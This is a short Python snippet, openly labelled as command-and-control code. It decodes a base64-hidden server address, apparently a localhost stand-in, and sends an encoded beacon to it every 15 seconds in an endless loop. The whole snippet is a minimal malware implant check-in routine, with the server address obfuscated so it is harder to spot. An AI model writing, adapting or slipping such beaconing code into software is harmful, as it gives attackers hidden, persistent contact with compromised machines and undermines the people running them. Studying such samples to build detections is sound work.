# C2 with base64-encoded beacon
import base64, requests, time, json

encoded = base64.b64decode("aHR0cDovLzEyNy4wLjAuMTo4NDQzL3JlZ2lzdGVy").decode()
while True:
    payload = base64.b64encode(json.dumps({"id": "abc"}).encode()).decode()
    requests.post(encoded, data={"beacon": payload})
    time.sleep(15)
